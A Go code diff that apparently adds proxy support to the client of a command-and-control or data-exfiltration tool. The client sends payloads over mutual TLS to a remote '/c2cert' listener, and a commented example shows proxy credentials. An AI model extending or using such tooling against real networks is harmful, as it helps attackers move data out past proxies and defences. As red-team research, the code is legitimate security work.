@@ -14,15 +14,14 @@ import (
 	"encoding/pem"
 	"flag"
 	"fmt"
+	"github.com/sourcefrenchy/cryptopayload"
 	"io"
 	"io/ioutil"
 	"log"
 	"math/big"
 	"net"
 	"net/http"
-
-	"github.com/sourcefrenchy/cryptopayload"
-
+	"net/url"
 	"os"
 	"strings"
 	"time"
@@ -37,6 +36,7 @@ var tlsPort = "8443"
 var (
 	listen     = flag.Bool("listen", false, "Start your TLS listener and wait for payload.")
 	host       = flag.String("host", "", "Comma-separated hostnames and IPs to generate a certificate for")
+	proxy      = flag.String("proxy", "", "proxy info formatted as http://user:pwd@proxy:port")
 	validFrom  = flag.String("start-date", "", "Creation date formatted as Jan 1 15:04:05 2011")
 	validFor   = flag.Duration("duration", 365*24*time.Hour, "Duration that certificate is valid for")
 	isCA       = flag.Bool("ca", false, "whether this cert should be its own Certificate Authority")
@@ -139,21 +139,39 @@ func tlsConnect(payloadDat string, host string) {
 	caCertPool := x509.NewCertPool()
 	caCertPool.AppendCertsFromPEM(caCert)
 
-	// Create a HTTPS client and supply the created CA pool and certificate
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{
-				RootCAs:      caCertPool,
-				Certificates: []tls.Certificate{cert},
-			},
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			RootCAs:      caCertPool,
+			Certificates: []tls.Certificate{cert},
 		},
+	}
+
+	// Create a HTTPS client and supply the created CA pool and certificate
+	// proxyStr := "http://usera:w00tw00t@127.0.0.1:3128"
+	if len(*proxy) != 0 {
+		u, err := url.Parse(*proxy)
+		if err != nil {
+			log.Fatal(err)
+		} else {
+			log.Println("[*] Using proxy settings:", *proxy)
+			transport.Proxy = http.ProxyURL(u)
+		}
+	}
+
+	client := &http.Client{
+		Transport: transport,
 	}
 
 	// Request /hello via the created HTTPS client over port tlsPort via GET
 	r, err := client.Get("https://" + host + ":" + tlsPort + "/c2cert")
 	if err != nil {
+		fmt.Printf("[!] Proxy issues: \n\t")
 		log.Fatal(err)
 	}
+
+	// if !strings.Contains(string(client.status), "200 OK") {
+	// 	log.Fatalf("[!] Issues connect to the proxy, check proxy information.")
+	// }
 
 	// Read the response body
 	defer r.Body.Close()
